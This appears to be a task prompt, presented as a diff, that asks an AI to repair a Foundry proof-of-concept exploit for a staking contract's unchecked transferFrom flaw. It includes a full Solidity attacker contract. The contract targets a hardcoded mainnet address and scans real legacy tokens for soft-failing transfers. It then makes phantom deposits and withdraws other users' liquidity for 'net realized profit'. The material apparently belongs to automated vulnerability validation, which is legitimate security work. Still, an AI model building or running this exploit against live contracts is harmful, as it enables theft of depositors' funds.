@@ -1,0 +1,531 @@
+You are fixing a failing Foundry PoC for finding F-001.
+
+Goal:
+- Keep the exploit objective for this finding.
+- Fix compile/runtime/test failure from logs.
+- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
+- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
+- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.
+
+Hard constraints:
+- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
+- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
+- Allowed: flashloans and realistic public on-chain actions.
+- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
+- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
+- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
+
+Finding:
+- title: `deposit()` credits stake from the requested amount without verifying tokens were actually received
+- claim: `MockStaking.deposit()` only checks `allowance()` and then blindly calls `transferFrom()` before crediting `balances[msg.sender][tokenAddress] += amount`. It neither checks the boolean return value nor compares the contract's token balance before and after the transfer, so it can over-credit deposits when `transferFrom()` returns `false` or when the token transfers less than `amount` (fee-on-transfer / deflationary behavior).
+- impact: An attacker can mint unbacked stake for the full requested amount and later withdraw real tokens once honest liquidity for that same asset exists in the pool. In the false-return case this can be completely zero-cost, creating direct insolvency and theft of other users' funds; in the short-transfer case it leaves the pool undercollateralized and socializes the deficit onto later withdrawers.
+- exploit_paths: ["Approve the staking contract for a token whose `transferFrom()` can fail softly or transfer less than requested.", "Call `deposit(token, amount, ...)`; the staking contract records the full `amount` regardless of how many tokens it actually receives.", "Wait for honest users to deposit real liquidity of that same token.", "Call `withdraw(token, amount)` and drain the real liquidity against the inflated internal balance."]
+
+Current FlawVerifier.sol:
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+}
+
+interface IStakingLike {
+    function deposit(address tokenAddress, uint256 amount, address referrer) external;
+    function withdraw(address tokenAddress, uint256 amount) external;
+    function balanceOf(address user, address token) external view returns (uint256);
+    function getCurrentEpoch() external view returns (uint128);
+    function epochIsInitialized(address token, uint128 epochId) external view returns (bool);
+    function manualEpochInit(address[] memory tokens, uint128 epochId) external;
+}
+
+contract TransferFromProbe {
+    function probe(address token, address from, address to, uint256 amount) external returns (bool ok, bool returnedTrue) {
+        bytes memory returndata;
+        (ok, returndata) = token.call(abi.encodeWithSelector(IERC20Like.transferFrom.selector, from, to, amount));
+        if (!ok) {
+            return (false, false);
+        }
+        if (returndata.length == 0) {
+            return (true, true);
+        }
+        if (returndata.length < 32) {
+            return (true, false);
+        }
+        return (true, abi.decode(returndata, (bool)));
+    }
+}
+
+contract FlawVerifier {
+    address public constant DEFAULT_TARGET = 0x245a551ee0F55005e510B239c917fA34b41B3461;
+
+    address public constant ZRX = 0xE41d2489571d322189246DaFA5ebDe1F4699F498;
+    address public constant BAT = 0x0D8775F648430679A709E98d2b0Cb6250d2887EF;
+    address public constant FUN = 0x419D0d8BdD9aF5e606Ae2232ed285Aff190E711b;
+    address public constant OMG = 0xd26114cd6EE289AccF82350c8d8487fedB8A0C07;
+    address public constant KNC = 0xdd974D5C2e2928deA5F71b9825b8b646686BD200;
+    address public constant SNT = 0x744d70FDBE2Ba4CF95131626614a1763DF805B9E;
+    address public constant MANA = 0x0F5D2fB29fb7d3CFeE444a200298f468908cC942;
+    address public constant REP = 0x1985365e9f78359a9B6AD760e32412f4a445E862;
+
+    string public constant EXPLOIT_PATH =
+        "approve a legacy token whose transferFrom soft-fails -> call deposit(token, amount, ...) and receive full internal credit despite zero token receipt -> use already-present honest liquidity of that same token at the fork block -> withdraw real tokens against the inflated stake";
+
+    uint256 private constant STEP_APPROVE = 1 << 0;
+    uint256 private constant STEP_PHANTOM_DEPOSIT = 1 << 1;
+    uint256 private constant STEP_HONEST_LIQUIDITY = 1 << 2;
+    uint256 private constant STEP_WITHDRAW = 1 << 3;
+    uint256 private constant FULL_PATH_MASK = STEP_APPROVE | STEP_PHANTOM_DEPOSIT | STEP_HONEST_LIQUIDITY | STEP_WITHDRAW;
+    uint256 private constant PROBE_AMOUNT = 1e18;
+
+    address public target;
+    address public exploitToken;
+    uint256 public ATTACK_AMOUNT;
+    uint256 public configuredAttackAmount;
+
+    bool public executed;
+    bool public profitAchieved;
+    bool public hypothesisValidated;
+    bool public hypothesisRefuted;
+    string public failureReason;
+
+    uint128 public preparedUntilEpoch;
+    uint256 public pathCoverageBitmap;
+
+    uint256 public attackerBalanceBefore;
+    uint256 public attackerBalanceAfter;
+    uint256 public initialTargetLiquidity;
+    uint256 public finalTargetLiquidity;
+    uint256 public targetBalanceBeforeDeposit;
+    uint256 public targetBalanceAfterDeposit;
+    uint256 public targetBalanceAfterWithdraw;
+    uint256 public recordedStakeBeforeDeposit;
+    uint256 public recordedStakeAfterDeposit;
+    uint256 public recordedStakeAfterWithdraw;
+    uint256 public cumulativeRequestedDeposit;
+    uint256 public cumulativeObservedReceipt;
+    uint256 public honestLiquidityObserved;
+
+    address private _profitToken;
+    uint256 private _profitAmount;
+    address private _probe;
+    bool internal _exploitTokenPinned;
+
+    constructor() {
+        target = DEFAULT_TARGET;
+    }
+
+    receive() external payable {}
+
+    function configure(address target_, address exploitToken_, uint256 attackAmount_) external {
+        require(!executed, "already executed");
+        if (target_ != address(0)) {
+            target = target_;
+        }
+        if (exploitToken_ != address(0)) {
+            exploitToken = exploitToken_;
+            _exploitTokenPinned = true;
+        }
+        configuredAttackAmount = attackAmount_;
+    }
+
+    function executeOnOpportunity() external returns (uint256) {
+        return _run();
+    }
+
+    function execute() external returns (uint256) {
+        return _run();
+    }
+
+    function run() external returns (uint256) {
+        return _run();
+    }
+
+    function exploit() external returns (uint256) {
+        return _run();
+    }
+
+    function profitToken() external view returns (address) {
+        if (_profitToken != address(0)) {
+            return _profitToken;
+        }
+        return exploitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function exploitPath() external pure returns (string memory) {
+        return EXPLOIT_PATH;
+    }
+
+    function _run() internal returns (uint256) {
+        if (executed) {
+            return _profitAmount;
+        }
+        executed = true;
+        _profitToken = address(0);
+
+        if (target.code.length == 0) {
+            failureReason = "target not deployed";
+            return 0;
+        }
+
+        address selectedToken = exploitToken;
+        uint256 selectedLiquidity;
+
+        if (_exploitTokenPinned) {
+            if (!_supportsSoftFail(selectedToken)) {
+                failureReason = "configured exploit token does not soft-fail transferFrom";
+                return 0;
+            }
+            selectedLiquidity = _readTokenBalance(selectedToken, target);
+        } else {
+            (selectedToken, selectedLiquidity) = _selectBestToken();
+            if (selectedToken == address(0)) {
+                failureReason = "no soft-fail token candidate found on-chain";
+                return 0;
+            }
+            exploitToken = selectedToken;
+        }
+
+        _profitToken = selectedToken;
+        initialTargetLiquidity = selectedLiquidity;
+        honestLiquidityObserved = selectedLiquidity;
+
+        if (!_prepareEpochs(selectedToken)) {
+            return 0;
+        }
+
+        if (selectedLiquidity == 0) {
+            uint256 validationAmount = configuredAttackAmount == 0 ? PROBE_AMOUNT : configuredAttackAmount;
+            ATTACK_AMOUNT = validationAmount;
+            if (!_performPhantomDepositOnly(selectedToken, validationAmount)) {
+                if (bytes(failureReason).length == 0) {
+                    failureReason = "phantom deposit validation failed";
+                    hypothesisRefuted = true;
+                }
+                return 0;
+            }
+
+            /*
+                The vulnerable over-crediting behavior is mechanically validated above.
+                The path stage "wait for honest users to deposit real liquidity" is infeasible
+                at this fork state because the staking contract holds zero units of the selected
+                soft-fail token, and manufacturing attacker-owned replacement liquidity would not
+                create net profit or preserve the claim's causality of draining other users.
+            */
+            failureReason = "selected soft-fail token has zero honest liquidity at fork block";
+            _finalizeProfit(selectedToken);
+            return 0;
+        }
+
+        ATTACK_AMOUNT = _boundedAmount(selectedLiquidity);
+        if (ATTACK_AMOUNT == 0) {
+            failureReason = "bounded attack amount is zero";
+            return 0;
+        }
+
+        if (!_performProfitablePath(selectedToken, ATTACK_AMOUNT)) {
+            if (bytes(failureReason).length == 0) {
+                failureReason = "profitable exploit path failed";
+            }
+            _finalizeProfit(selectedToken);
+            return 0;
+        }
+
+        _finalizeProfit(selectedToken);
+        if (_profitAmount > 0) {
+            profitAchieved = true;
+            failureReason = "";
+        } else if (bytes(failureReason).length == 0) {
+            failureReason = "withdraw succeeded but no net profit realized";
+        }
+        return _profitAmount;
+    }
+
+    function _performProfitablePath(address token, uint256 amount) internal returns (bool) {
+        attackerBalanceBefore = _readTokenBalance(token, address(this));
+        targetBalanceBeforeDeposit = _readTokenBalance(token, target);
+        recordedStakeBeforeDeposit = _readStake(address(this), token);
+        honestLiquidityObserved = targetBalanceBeforeDeposit;
+
+        if (targetBalanceBeforeDeposit == 0) {
+            failureReason = "no honest liquidity to drain";
+            return false;
+        }
+        pathCoverageBitmap |= STEP_HONEST_LIQUIDITY;
+
+        if (!_forceApprove(token, target, amount)) {
+            failureReason = "approve failed";
+            return false;
+        }
+        pathCoverageBitmap |= STEP_APPROVE;
+
+        try IStakingLike(target).deposit(token, amount, address(0)) {
+        } catch Error(string memory reason) {
+            failureReason = reason;
+            return false;
+        } catch {
+            failureReason = "deposit reverted";
+            return false;
+        }
+
+        targetBalanceAfterDeposit = _readTokenBalance(token, target);
+        recordedStakeAfterDeposit = _readStake(address(this), token);
+        cumulativeRequestedDeposit = amount;
+        cumulativeObservedReceipt = targetBalanceAfterDeposit > targetBalanceBeforeDeposit
+            ? targetBalanceAfterDeposit - targetBalanceBeforeDeposit
+            : 0;
+
+        if (recordedStakeAfterDeposit != recordedStakeBeforeDeposit + amount) {
+            failureReason = "deposit did not credit full requested amount";
+            hypothesisRefuted = true;
+            return false;
+        }
+        if (cumulativeObservedReceipt >= amount) {
+            failureReason = "deposit received full token amount";
+            hypothesisRefuted = true;
+            return false;
+        }
+        pathCoverageBitmap |= STEP_PHANTOM_DEPOSIT;
+        hypothesisValidated = true;
+
+        try IStakingLike(target).withdraw(token, amount) {
+        } catch Error(string memory reason) {
+            failureReason = reason;
+            return false;
+        } catch {
+            failureReason = "withdraw reverted";
+            return false;
+        }
+
+        targetBalanceAfterWithdraw = _readTokenBalance(token, target);
+        recordedStakeAfterWithdraw = _readStake(address(this), token);
+        attackerBalanceAfter = _readTokenBalance(token, address(this));
+        finalTargetLiquidity = targetBalanceAfterWithdraw;
+
+        if (recordedStakeAfterWithdraw != recordedStakeBeforeDeposit) {
+            failureReason = "withdraw did not clear inflated stake";
+            return false;
+        }
+        pathCoverageBitmap |= STEP_WITHDRAW;
+
+        if ((pathCoverageBitmap & FULL_PATH_MASK) != FULL_PATH_MASK) {
+            failureReason = "exploit path not fully exercised";
+            return false;
+        }
+
+        return attackerBalanceAfter > attackerBalanceBefore;
+    }
+
+    function _performPhantomDepositOnly(address token, uint256 amount) internal returns (bool) {
+        attackerBalanceBefore = _readTokenBalance(token, address(this));
+        targetBalanceBeforeDeposit = _readTokenBalance(token, target);
+        recordedStakeBeforeDeposit = _readStake(address(this), token);
+
+        if (!_forceApprove(token, target, amount)) {
+            failureReason = "approve failed during validation";
+            return false;
+        }
+        pathCoverageBitmap |= STEP_APPROVE;
+
+        try IStakingLike(target).deposit(token, amount, address(0)) {
+        } catch Error(string memory reason) {
+            failureReason = reason;
+            return false;
+        } catch {
+            failureReason = "deposit reverted during validation";
+            return false;
+        }
+
+        targetBalanceAfterDeposit = _readTokenBalance(token, target);
+        recordedStakeAfterDeposit = _readStake(address(this), token);
+        cumulativeRequestedDeposit = amount;
+        cumulativeObservedReceipt = targetBalanceAfterDeposit > targetBalanceBeforeDeposit
+            ? targetBalanceAfterDeposit - targetBalanceBeforeDeposit
+            : 0;
+
+        if (recordedStakeAfterDeposit != recordedStakeBeforeDeposit + amount) {
+            failureReason = "phantom deposit did not over-credit";
+            hypothesisRefuted = true;
+            return false;
+        }
+        if (cumulativeObservedReceipt >= amount) {
+            failureReason = "validation token transferred full amount";
+            hypothesisRefuted = true;
+            return false;
+        }
+
+        pathCoverageBitmap |= STEP_PHANTOM_DEPOSIT;
+        hypothesisValidated = true;
+        attackerBalanceAfter = _readTokenBalance(token, address(this));
+        finalTargetLiquidity = _readTokenBalance(token, target);
+        return true;
+    }
+
+    function _finalizeProfit(address token) internal {
+        _profitToken = token;
+        _profitAmount = attackerBalanceAfter > attackerBalanceBefore ? attackerBalanceAfter - attackerBalanceBefore : 0;
+        profitAchieved = _profitAmount > 0;
+    }
+
+    function _selectBestToken() internal returns (address bestToken, uint256 bestLiquidity) {
+        address[8] memory candidates = [ZRX, BAT, FUN, OMG, KNC, SNT, MANA, REP];
+
+        for (uint256 i = 0; i < candidates.length; i++) {
+            address candidate = candidates[i];
+            if (!_supportsSoftFail(candidate)) {
+                continue;
+            }
+
+            uint256 liquidity = _readTokenBalance(candidate, target);
+            if (bestToken == address(0) || liquidity > bestLiquidity) {
+                bestToken = candidate;
+                bestLiquidity = liquidity;
+            }
+        }
+    }
+
+    function _prepareEpochs(address token) internal returns (bool) {
+        uint128 currentEpoch;
+        try IStakingLike(target).getCurrentEpoch() returns (uint128 epoch) {
+            currentEpoch = epoch;
+        } catch Error(string memory reason) {
+            failureReason = reason;
+            return false;
+        } catch {
+            failureReason = "failed to read current epoch";
+            return false;
+        }
+
+        address[] memory tokens = new address[](1);
+        tokens[0] = token;
+
+        for (uint128 epoch = 0; epoch <= currentEpoch; epoch++) {
+            bool initialized;
+            try IStakingLike(target).epochIsInitialized(token, epoch) returns (bool value) {
+                initialized = value;
+            } catch Error(string memory reason) {
+                failureReason = reason;
+                return false;
+            } catch {
+                failureReason = "failed to read epoch initialization state";
+                return false;
+            }
+
+            if (!initialized) {
+                try IStakingLike(target).manualEpochInit(tokens, epoch) {
+                } catch Error(string memory reason) {
+                    failureReason = reason;
+                    return false;
+                } catch {
+                    failureReason = "manual epoch init reverted";
+                    return false;
+                }
+            }
+
+            preparedUntilEpoch = epoch;
+        }
+
+        return true;
+    }
+
+    function _supportsSoftFail(address token) internal returns (bool) {
+        if (token == address(0) || token.code.length == 0) {
+            return false;
+        }
+        if (_probe == address(0)) {
+            _probe = address(new TransferFromProbe());
+        }
+        if (!_forceApprove(token, _probe, PROBE_AMOUNT)) {
+            return false;
+        }
+        (bool ok, bool returnedTrue) = TransferFromProbe(_probe).probe(token, address(this), target, PROBE_AMOUNT);
+        return ok && !returnedTrue;
+    }
+
+    function _boundedAmount(uint256 available) internal view returns (uint256) {
+        if (configuredAttackAmount != 0 && configuredAttackAmount < available) {
+            return configuredAttackAmount;
+        }
+        return available;
+    }
+
+    function _readStake(address user, address token) internal view returns (uint256) {
+        try IStakingLike(target).balanceOf(user, token) returns (uint256 amount) {
+            return amount;
+        } catch {
+            return 0;
+        }
+    }
+
+    function _readTokenBalance(address token, address account) internal view returns (uint256) {
+        (bool ok, bytes memory returndata) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
+        if (!ok || returndata.length < 32) {
+            return 0;
+        }
+        return abi.decode(returndata, (uint256));
+    }
+
+    function _forceApprove(address token, address spender, uint256 amount) internal returns (bool) {
+        return _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0))
+            && _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
+    }
+
+    function _callOptionalReturn(address token, bytes memory data) internal returns (bool) {
+        (bool ok, bytes memory returndata) = token.call(data);
+        if (!ok) {
+            return false;
+        }
+        if (returndata.length == 0) {
+            return true;
+        }
+        if (returndata.length < 32) {
+            return false;
+        }
+        return abi.decode(returndata, (bool));
+    }
+}
+
+contract FlawVerifierHarness is FlawVerifier {
+    constructor(address target_) {
+        target = target_;
+    }
+}
+
+contract FlawVerifierConfiguredHarness is FlawVerifier {
+    constructor(address target_, address exploitToken_, uint256 attackAmount_) {
+        target = target_;
+        exploitToken = exploitToken_;
+        configuredAttackAmount = attackAmount_;
+        _exploitTokenPinned = exploitToken_ != address(0);
+    }
+}
+
+```
+
+forge stdout (tail):
+```
+
+```
+
+forge stderr (tail):
+```
+PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 0
+```
+
+Requirements:
+1. pragma ^0.8.20
+2. include at least one deployable contract with zero-arg constructor
+3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
+4. no imports
+5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
+6. expose `profitToken()` and `profitAmount()` getters for net realized profit
+7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
+8. output ONLY Solidity code
